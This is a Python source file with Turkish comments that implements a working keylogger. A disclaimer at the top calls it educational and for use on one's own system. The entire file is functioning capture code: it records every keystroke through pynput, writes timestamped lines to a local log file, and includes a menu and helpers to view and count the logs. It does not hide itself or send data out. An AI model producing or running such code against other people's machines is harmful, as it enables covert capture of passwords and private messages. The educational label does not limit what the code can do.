#!/usr/bin/env python3
"""
KEYLOGGER - EĞİTİM AMAÇLI
Sadece kendi sisteminizde test etmek içindir.
Yetkisiz kullanım YASAKTIR!
"""

import keyboard
import datetime
import time
import os
import threading
from pynput import keyboard as pynput_keyboard

class SafeKeylogger:
    
    def __init__(self, log_file="logs/tus_kayitlari.txt"):
        self.log_file = log_file
        self.running = True
        self.buffer = []
        
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        
        # Başlangıç mesajı
        self.yaz_log(f"\n{'='*50}")
        self.yaz_log(f"KEYLOGGER BAŞLATILDI: {datetime.datetime.now()}")
        self.yaz_log(f"{'='*50}\n")
    
    def yaz_log(self, text):
        """Log dosyasına yaz"""
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(text + '\n')
    
    def tus_basildi(self, key):
        """Tuş basıldığında çalışır"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                # Normal karakter
                tus = key.char
                self.buffer.append(tus)
                
                # Ekrana yazdırma (opsiyonel)
                print(tus, end='', flush=True)
                
            else:
                # Özel tuşlar
                ozel_tuslar = {
                    'Key.space': ' ',
                    'Key.enter': '\n[ENTER]\n',
                    'Key.tab': '\t',
                    'Key.backspace': '[BACKSPACE]',
                    'Key.shift': '[SHIFT]',
                    'Key.ctrl_l': '[CTRL]',
                    'Key.ctrl_r': '[CTRL]',
                    'Key.alt_l': '[ALT]',
                    'Key.alt_r': '[ALT]',
                    'Key.cmd': '[WIN]',
                    'Key.esc': '[ESC]',
                    'Key.up': '[UP]',
                    'Key.down': '[DOWN]',
                    'Key.left': '[LEFT]',
                    'Key.right': '[RIGHT]'
                }
                
                tus_adi = str(key)
                if tus_adi in ozel_tuslar:
                    tus = ozel_tuslar[tus_adi]
                else:
                    tus = f'[{tus_adi.replace("Key.", "")}]'
                
                self.buffer.append(tus)
                
                # Enter tuşu için özel işlem
                if tus == '\n[ENTER]\n':
                    satir = ''.join(self.buffer[:-1])  # Enter'dan öncekiler
                    self.yaz_log(f"[{datetime.datetime.now()}] {satir}")
                    self.buffer = []  # Buffer'ı temizle
                
                print(tus, end='', flush=True)
                
        except Exception as e:
            print(f"\n[!] Hata: {e}")
    
    def tus_birakildi(self, key):
        """Tuş bırakıldığında çalışır (opsiyonel)"""
        pass
    
    def baslat(self):
        """Keylogger'ı başlat"""
        print("\n" + "="*50)
        print("KEYLOGGER BAŞLATILDI - EĞİTİM AMAÇLI")
        print("Çıkmak için 'ESC' tuşuna 3 kez basın")
        print("="*50 + "\n")
        
        # Listener başlat
        with pynput_keyboard.Listener(
            on_press=self.tus_basildi,
            on_release=self.tus_birakildi
        ) as listener:
            
            # ESC ile çıkış kontrolü
            esc_count = 0
            while self.running:
                if keyboard.is_pressed('esc'):
                    esc_count += 1
                    if esc_count >= 3:
                        print("\n\n[!] Çıkış yapılıyor...")
                        self.running = False
                        self.yaz_log(f"\n{'='*50}")
                        self.yaz_log(f"KEYLOGGER DURDURULDU: {datetime.datetime.now()}")
                        self.yaz_log(f"{'='*50}\n")
                        break
                    time.sleep(0.5)
                else:
                    esc_count = 0
                time.sleep(0.1)
            
            listener.stop()
        
        print(f"\n✅ Log dosyası: {self.log_file}")

class KeyloggerAnaliz:
    """Keylogger loglarını analiz etmek için"""
    
    @staticmethod
    def log_oku(dosya_yolu):
        """Log dosyasını oku"""
        if not os.path.exists(dosya_yolu):
            print("Log dosyası bulunamadı!")
            return None
        
        with open(dosya_yolu, 'r', encoding='utf-8') as f:
            return f.read()
    
    @staticmethod
    def istatistik_goster(dosya_yolu):
        """Log istatistiklerini göster"""
        log = KeyloggerAnaliz.log_oku(dosya_yolu)
        if log:
            print("\n" + "="*50)
            print("LOG İSTATİSTİKLERİ")
            print("="*50)
            print(f"Toplam karakter: {len(log)}")
            print(f"Satır sayısı: {log.count(chr(10))}")
            print(f"Zaman damgaları: {log.count('[')}")

def main():
    """Ana fonksiyon"""
    print("""
      keylogger sistem aktif
    """)
    
    print("Seçenekler:")
    print("1. Keylogger'ı başlat")
    print("2. Logları görüntüle")
    print("3. İstatistikleri göster")
    print("4. Çıkış")
    
    secim = input("\nSeçiminiz (1-4): ")
    
    if secim == "1":
        keylogger = SafeKeylogger()
        try:
            keylogger.baslat()
        except KeyboardInterrupt:
            print("\n\n[!] Manuel durduruldu.")
    
    elif secim == "2":
        log = KeyloggerAnaliz.log_oku("logs/tus_kayitlari.txt")
        if log:
            print("\n" + "="*50)
            print("LOG İÇERİĞİ")
            print("="*50)
            print(log)
    
    elif secim == "3":
        KeyloggerAnaliz.istatistik_goster("logs/tus_kayitlari.txt")
    
    elif secim == "4":
        print("Çıkış yapılıyor...")
    
    else:
        print("Geçersiz seçim!")

if __name__ == "__main__":
    main()
